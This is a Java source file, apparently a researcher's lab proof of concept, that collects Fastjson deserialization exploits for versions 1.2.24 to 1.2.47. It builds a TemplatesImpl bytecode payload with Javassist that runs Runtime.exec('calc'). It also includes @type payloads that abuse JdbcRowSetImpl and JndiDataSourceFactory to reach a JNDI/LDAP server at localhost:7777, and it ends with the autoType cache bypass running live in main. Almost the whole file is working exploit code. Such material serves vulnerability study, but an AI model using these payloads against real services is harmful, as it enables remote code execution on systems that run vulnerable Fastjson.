import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.alibaba.fastjson.support.config.FastJsonConfig;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.*;

import java.io.IOException;
import java.util.Base64;

public class EvilClass {
    /* For templatesImpl evilcode generation*/
    public static String getEvilCode() throws CannotCompileException, IOException, NotFoundException {
    ClassPool classPool = ClassPool.getDefault();
    CtClass ctClass = classPool.makeClass("Evil");
    classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
    ctClass.makeClassInitializer().insertBefore("Runtime.getRuntime().exec(\"calc\");");
    ctClass.setSuperclass(classPool.getCtClass(AbstractTranslet.class.getName()));

    byte[] bytes = ctClass.toBytecode();
    String s = Base64.getEncoder().encodeToString(bytes);
    System.out.println(s);
    return s;
    }
    public static void main(String[] args) throws CannotCompileException, IOException, NotFoundException {

        /* Serialization 演示*/
/*        User user = new User();
        user.setName("leihehe");
        String result = JSON.toJSONString(user);
        String result2 = JSON.toJSONString(user, SerializerFeature.WriteClassName);//Label the class name
        System.out.println(result);
        System.out.println(result2);*/

        /* Deserialization */
/*      String jsonString="{\"name\":\"leihehe\"}";
        JSONObject jsonObject = JSON.parseObject(jsonString);
        System.out.println(jsonObject);

        String jsonString2 = "{\"@type\":\"User\",\"name\":\"leihehe\"}";
        Object obj2 = JSON.parse(jsonString2);
        System.out.println(obj2);
*/

        /* 1.2.24利用 */
        //String evilStr1="{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\""+getEvilCode()+"\"],\"_name\":\"leihehe\",\"_tfactory\":{ },\"outputProperties\":{ }}\n";
        //String evilStr2="{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:7777/#EvilObject\",\"autoCommit\":true}";

        /* 1.2.25-1.2.41利用 */
        //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        //String evilStr1="{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://127.0.0.1:7777/#EvilObject\",\"autoCommit\":true}";
        //String evilStr2="{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"ldap://127.0.0.1:7777/#EvilObject\",\"autoCommit\":true}";

        /* 1.2.42利用 */
        //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        //String evilStr1="{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"ldap://127.0.0.1:7777/#EvilObject\",\"autoCommit\":true}";
        //String evilStr2="{\"@type\":\"LLLcom.sun.rowset.JdbcRowSetImpl;;;\",\"dataSourceName\":\"ldap://127.0.0.1:7777/#EvilObject\",\"autoCommit\":true}";

        /* 1.2.43利用 */
        //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        //String evilStr1="{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"ldap://127.0.0.1:7777/#EvilObject\",\"autoCommit\":true}";

        /* 1.2.44利用 */
        //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        //String evilStr= "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://localhost:7777/#EvilObject\"}}";
        //JSON.parseObject(evilStr,Object.class);

        /* 1.2.25 - 1.2.47 通杀绕过*/
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

        String evilStr="{\n" +
                "   \"a\":{\n" +
                "       \"@type\":\"java.lang.Class\",\n" +
                "       \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n" +
                "   },\n" +
                "   \"b\":{\n" +
                "       \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
                "       \"dataSourceName\":\"ldap://localhost:7777/#EvilObject\",\n" +
                "       \"autoCommit\":true\n" +
                "   }\n" +
                "}";
        JSON.parseObject(evilStr,Object.class);

    }
}
